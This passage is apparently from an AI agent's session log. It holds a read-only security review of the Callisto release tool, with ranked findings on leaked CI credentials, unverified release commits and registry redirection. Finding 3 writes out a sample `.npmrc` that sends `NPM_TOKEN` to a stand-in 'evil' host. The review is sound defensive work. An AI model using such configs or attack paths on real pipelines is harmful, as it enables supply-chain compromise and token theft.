s: {}`. Registry secrets appear only on the `execute` step. A policy script asserts that and the SHA pins (`verify-action-pins.sh`, `verify-release-workflow-policy.sh`), and has negative tests. Expressions reach shell only through `env:`. Handoffs are verified before credentials are exposed. Downloads land outside the worktree. CI uses `pull_request`, never `pull_request_target`, and checks out with `persist-credentials: false`. CODEOWNERS covers workflows and actions.\n  5. **Redaction and containment.** Known secrets, token-shape prefixes, `Bearer` values, `_authToken` lines and URL userinfo are redacted in live echo, in error Display and in JSON error messages, while classifiers keep the raw text. Config paths (changelog, changesets dir) reject absolute paths and `..`. Writes go through a symlink-rejecting preflight plus `atomic_write`. Package discovery rejects symlinked packages. Packages publish only when `publish-to` is set explicitly. The Python build step runs with every release credential removed.","handback":true,"handbackReportText":"Adversarial security review of Callisto v0.14.2 (read-only). I did not reproduce anything: the worktree guard refused the git commands I needed to build scratch repos, so every finding is READ from code, with file:line. `../callisto-findings/FINDINGS.md` does not exist. Nothing was written to the repo.\n\n## Findings, ranked\n\n**1. HIGH: the execute job leaves a `contents: write` token on disk where publish-time code runs.**\n- Location: `.github/workflows/callisto-release.yml:424` (`persist-credentials: true` on the `release-source` checkout). `.github/tests/verify-release-workflow-policy.sh:350-352` requires it. The generated templates copy it: `crates/callisto-graph/src/templates/simple_workflow.tmpl:24` and `matrix_workflow.tmpl:222`.\n- Attack: `cargo publish` verify-builds dependency `build.rs`/proc-macros, `npm publish` runs lifecycle scripts, and `python -m build` runs build backends, all inside that checkout. Any of them can read the persisted checkout credential, so the per-tool env scrubbing in `crates/callisto-cli/src/runner.rs:95-110` does not protect it. I did not confirm where checkout v7 stores the credential (`.git/config` or a file under `RUNNER_TEMP`); either way it is readable by any child process.\n- Impact: a compromised dependency can push tags, create releases, and push commits. The workflow-path guard only blocks `.github/workflows/*`, not `.github/actions/**`. `.github/scripts/move-floating-tag.sh:48` already force-pushes `v1` with this token, so a poisoned `v1` would hit every consumer of `callisto-action@v1`.\n- Fix: do the tag and floating-tag push in a separate credentialed step or job after publish, or give git a one-shot `GH_TOKEN` header and set `persist-credentials: false`.\n\n**2. MEDIUM-HIGH: release-commit verification does not constrain which other files the release PR changes.**\n- Location: `crates/callisto-graph/src/commands/release_decision.rs:385-579`.\n- ADR 2 says the diff matches the decision \"no more and no less\". The code only checks four things: the decision file is added or modified, a changeset is deleted, the claimed manifests move to the claimed versions, and the claimed changelogs are touched. Any other path can change in the same commit: `build.rs`, `.cargo/config.toml`, `.npmrc`, `callisto.toml` (registries, `publish-to`), `Cargo.lock`, `.github/actions/**`.\n- Attack: anyone with write access pushes a branch named `callisto/version-packages` carrying hidden changes. Reviewers expect a bot diff, and merging it runs `execute` with secrets.\n- The workflow's provenance checks (`callisto-release.yml:141-142`: merged PR with that head ref, plus `commit.verification.verified`) are not discriminating. GitHub signs every web-UI or API merge, so \"verified\" does not mean \"made by the bot\".\n- Fix: require the release commit's tree to equal a re-run of `callisto version` on the parent, or allow only an allowlist of paths (manifests, changelogs, lockfiles, decision file, changesets, `pre.json`).\n\n**3. MEDIUM: the default npm and cargo publish destinations are not bound by the intent.**\n- Location: `crates/callisto-graph/src/commands/release/binding.rs:82-106` and `crates/callisto-graph/src/commands/registry_argv.rs:72-76`; npm publish call at `crates/callisto-graph/src/commands/release/provider/registry.rs:721-749`.\n- For built-in registries with no `url` in config, `endpoint` is `None`. The npm publish then runs with no `--registry`, and cargo publish runs with no `--registry` for crates.io. The destination is whatever the checkout's `.npmrc` or `.cargo/config.toml` says. The digest only covers the key bytes.\n- Attack for npm: a committed `.npmrc` with `registry=https://evil/` and `//evil/:_authToken=${NPM_TOKEN}` sends `NPM_TOKEN` there, because the publisher env sets `NPM_TOKEN` (`registry.rs:760-770`). The same gap lets cargo or twine publish to a registry other than the one named in the intent.\n- This contradicts the module doc at `binding.rs:1-4` (\"no caller-supplied endpoint ... can reach a provider\").\n- Fix: always pass the built-in URL explicitly (`--registry`, `--repository-url`), and pass `--userconfig` or ignore the project `.npmrc`.\n\n**4. MEDIUM: child-process credential scrubbing is a denylist with gaps.**\n- Location: `crates/callisto-cli/src/runner.rs:52-110` and `:213-217`; the build-step list at `registry.rs` (`RELEASE_CREDENTIALS`, about line 395).\n- It removes ten fixed names. It does not remove `CARGO_REGISTRIES_<NAME>_TOKEN`, even though the redactor knows that pattern (`crates/callisto-model/src/registry.rs` `known_credential_env_values`). It also leaves `ACTIONS_ID_TOKEN_REQUEST_*`, `UV_PUBLISH_TOKEN` and similar variables for git, npm and the Python build backend. A sibling-pattern mismatch: redaction covers it, scrubbing does not.\n- Separately, `cargo publish` runs without `--no-verify` and with `CARGO_REGISTRY_TOKEN` in its env, so dependency build scripts run in the credentialed job.\n- Fix: switch to an allowlist environment per tool, and run `cargo package` in the credential-free `build` job, then `publish --no-verify`.\n\n**5. MEDIUM: the generated matrix workflow installs unlocked code in the privileged execute job.**\n- Location: `crates/callisto-graph/src/templates/matrix_workflow.tmpl:231` (`pip install twine`), `:251` (`npx --yes --package @napi-rs/cli@3.10.4 napi artifacts`), and `crates/callisto-graph/src/commands/init.rs:812`.\n- Only the top-level packages are pinned. Transitive dependencies resolve at run time, with no lockfile or hashes, in a job that holds `contents: write` and `id-token: write` plus the persisted credential from finding 1.\n- Fix: install from hashed requirement files and a lockfile, or move the installs into a credential-free job and pass the results in as artifacts.\n\n**6. MEDIUM: the installer can silently run unreleased `main` HEAD, and attestation is not tied to the release.**\n- Location: `.github/actions/setup-callisto/scripts/install-callisto.sh:190`.\n- With `version: latest`, if the prebuilt asset fails verification or the crates.io install fails (for example a toolchain older than the MSRV), it runs `cargo install --locked --git https://github.com/orin-dx/callisto.git` and builds the default branch HEAD. That binary then runs with publish credentials, and the workflow only warns about the earlier steps.\n- `gh attestation verify` (about line 95) pins repo and signer workflow but not `--signer-digest`, `--source-ref` or the release tag. Any attested asset from any past run satisfies it. `verification: skip` runs the asset unverified.\n- Fix: drop the git fallback, or pin it to the resolved tag commit. Add `--source-ref refs/tags/<tag>` to the verify call.\n\n**7. LOW-MEDIUM: `git add -A` can commit stray untracked files to a public release PR.**\n- Location: `.github/actions/callisto-action/scripts/create-or-update-release-pr.sh:84`.\n- `commit-plan` (`crates/callisto-model/src/release_pr.rs:746-755`) rejects only `.github/workflows/*` and `.git/*`. An untracked credential file written by an earlier step (for example `.cargo/credentials.toml` or a workspace `.npmrc`) is committed via the forge API.\n- Fix: stage only paths that `callisto version` reports it touched, and fail on any other untracked file.\n\n**8. LOW: the recovery dispatch does not check that `release_source_sha` is on `main`.**\n- Location: `.github/workflows/callisto-release.yml:125-142`.\n- It only checks that the SHA is 40 hex characters, resolves, and is linked to a merged PR whose head ref matches the pattern. A superseded head commit of a merged release PR can match and be re-released as an older state.\n- Fix: require `git merge-base --is-ancestor` against `main`, or require the SHA to be a first-parent commit of `main`.\n\n**9. LOW: a recovery or maintenance-line stable npm publish moves `latest` backwards.**\n- Location: `crates/callisto-graph/src/commands/release/derive.rs:336-351` (the dist-tag is only set for prereleases) and `registry_argv.rs:npm_publish_flags`.\n- Stable versions get no `--tag`. Recovering an older release, or releasing 1.2.1 after 2.0.0, repoints `latest` at the older version.\n- Fix: compare against the registry's current `latest` and pass `--tag` when the version is lower.\n\n**10. LOW: build and attest happen in the same job.**\n- Location: `.github/workflows/callisto-release.yml:297` (`id-token: write`) and `:334` (the attest step).\n- The release-source compile (with all dependency `build.rs`) runs in a job that can request OIDC tokens, which weakens the provenance claim.\n- Fix: upload the artifact, then attest it in a separate job that runs no build code.\n\n**11. LOW: adoption of an existing registry version only warns on a repository mismatch.**\n- Location: `docs/architecture/release.md` (adoption paragraph) and the `repository()` methods in `registry.rs`.\n- A name-squatted exact version is adopted, then tagged and released as if Callisto published it. This is documented behaviour. Consider making the mismatch a hard stop when the registry records a repository.\n\n**12. LOW: `__BRANCH__` is substituted unquoted into YAML flow context.**\n- Location: `crates/callisto-graph/src/commands/init.rs` `render_workflow`, used at `simple_workflow.tmpl:3,15` and `matrix_workflow.tmpl:5,21`.\n- A default-branch name containing `,`, `]`, `#` or `{` changes the workflow's trigger list, and so which pushes run the release job. It is self-inflicted by the repo owner but easy to fix.\n- Fix: YAML-quote the branch name.\n\n## Also noted (not ranked)\n- The simple template's `release` job (`simple_workflow.tmpl:19-27`) has no release-PR gate. Any push to the default branch that leaves an unpublished version in a `publish-to` package publishes it. This is the local route by design, but it is a different trust level from Callisto's own workflow.\n\n## Done well, do not touch\n1. **Execute re-derives the intent.** `validate_intent` (`crates/callisto-graph/src/commands/release/capability.rs:326-373`) rebuilds the intent from the detached checkout and rejects any difference. It also rechecks trust and the git remote before effects. A tampered or replayed intent artifact cannot widen what gets published. The decision cross-check rejects unclaimed version changes, a stale decision file, or no consumed changeset.\n2. **Artifact path and attestation handling.** `release_artifacts.rs:174-247` allows single-component names only, rejects symlinks, canonicalises and re-checks containment, and checks sha256 and size. It verifies with `--signer-workflow`, `--signer-digest`, `--source-digest` and `--deny-self-hosted-runners`. The CLI manifest builder repeats the symlink and escape checks.\n3. **Argument-injection defences.** Tag names reject a leading `-`, `..`, `:`, `~`, `^`, glob characters and control characters (`crates/callisto-model/src/tag.rs:133-159`). Tag templates are validated against a stand-in version. Dist-tags are ASCII letters only. Package names use joined `--filter=` and `--workspace=` forms. Git uses `--`. The twine file list is explicit, with no glob. Registry URLs are https-only, with no userinfo, query or fragment. An npm `publishConfig.registry` override must match an approved registry.\n4. **Workflow structure.** Default `permissions: {}`. Registry secrets appear only on the `execute` step. A policy script asserts that and the SHA pins (`verify-action-pins.sh`, `verify-release-workflow-policy.sh`), and has negative tests. Expressions reach shell only through `env:`. Handoffs are verified before credentials are exposed. Downloads land outside the worktree. CI uses `pull_request`, never `pull_request_target`, and checks out with `persist-credentials: false`. CODEOWNERS covers workflows and actions.\n5. **Redaction and containment.** Known secrets, token-shape prefixes, `Bearer` values, `_authToken` lines and URL userinfo are redacted in live echo, in error Display and in JSON error messages, while classifiers keep the raw text. Config paths (changelog, changesets dir) reject absolute paths and `..`. Writes go through a symlink-rejecting preflight plus `atomic_write`. Package discovery rejects symlinked packages. Packages publish only when `publish-to` is set explicitly. The Python build step runs with every release credential removed."},"promptSource":"system","queueSkipSlashCommands":true,"turnOrigin":"peer","turnPosition":{"promptIndex":185,"turnIndex":329},"queueSkipAttachments":true,"sessionKind":"bg","userType":"external","entrypoint":"cli","cwd":"/Users/gabe/Projects/callisto/.claude/worktrees/smoke-main","sessionId":"15c732d1-457b-4efc-91e5-664943f21b1c","version":"2.1.304","gitBranch":"chore/release-target-facts","slug":"lexical-jingling-puppy"}
